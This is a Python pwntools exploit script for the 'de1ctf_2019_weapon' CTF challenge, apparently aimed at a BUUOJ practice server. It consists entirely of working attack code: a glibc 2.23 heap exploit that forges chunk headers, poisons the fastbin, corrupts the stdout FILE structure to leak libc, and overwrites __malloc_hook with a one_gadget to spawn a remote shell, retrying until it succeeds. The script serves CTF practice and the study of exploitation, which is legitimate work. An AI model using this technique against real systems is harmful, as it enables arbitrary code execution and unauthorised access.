from pwn import *

#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(index, size, name):
    p.sendlineafter(b'choice >> ', b'1')
    p.sendlineafter(b'size of weapon: ', str(size).encode())
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'name:', name)

def delete(index):
    p.sendlineafter(b'choice >> ', b'2')
    p.sendlineafter(b'idx :', str(index).encode())

def edit(index, name):
    p.sendlineafter(b'choice >> ', b'3')
    p.sendlineafter(b'idx: ', str(index).encode())
    p.sendafter(b'content:', name)

def exploit():
    alloc(0, 0x20, p64(0) + p64(0x21))
    alloc(1, 0x10, b'a')
    alloc(2, 0x10, b'a')
    #wtf, glibc will check the header of next chunk while free, so we need to write a fake header (0x70, 0x51)
    alloc(3, 0x10, p64(0x70) + p64(0x51)) 

    delete(1)
    delete(2)
    edit(2, b'\x10')

    alloc(1, 0x10, b'a')
    alloc(1, 0x10, b'a')
    alloc(4 ,0x30, b'a')
    alloc(5 ,0x30, b'a')
    alloc(6, 0x10, b'a')

    edit(0, p64(0) + p64(0x71))
    delete(1)
    edit(0, p64(0) + p64(0x101))
    delete(1)
    edit(0, p64(0) + p64(0x71))
    edit(1, b'\xdd\x75')

    alloc(0, 0x60, b'a')
    alloc(0, 0x60, b'a')
    alloc(6, 0x60, b'a')

    payload = b'a' * ( 0x620 - 0x5ed ) + p64(0xfbad1800) + p64(0) * 3 + b'\x00'
    edit(0, payload)

    p.recvuntil(b'\x7f')
    libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 131 - libc.sym['_IO_2_1_stdout_']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    success('libc_base -> {}'.format(hex(libc_base)))

    one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
    one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one = libc_base + one_gadgets_buu[3]

    delete(6)
    edit(6, p64(malloc_hook - 0x23))

    #context.log_level = 'debug'
    alloc(6, 0x60, b'a')
    alloc(6, 0x60, b'a' * 0x13 + p64(one))

    p.sendlineafter(b'choice >> ', b'1')
    p.sendlineafter(b'size of weapon: ', b'1')
    p.sendlineafter(b'index: ', b'1')

    p.interactive()

if __name__ == '__main__':
    flag = False
    while not flag:
        try:
            #p = process('./de1ctf_2019_weapon')
            p = remote('node4.buuoj.cn', 25710)
            exploit()
            flag = True
        except:
            p.close()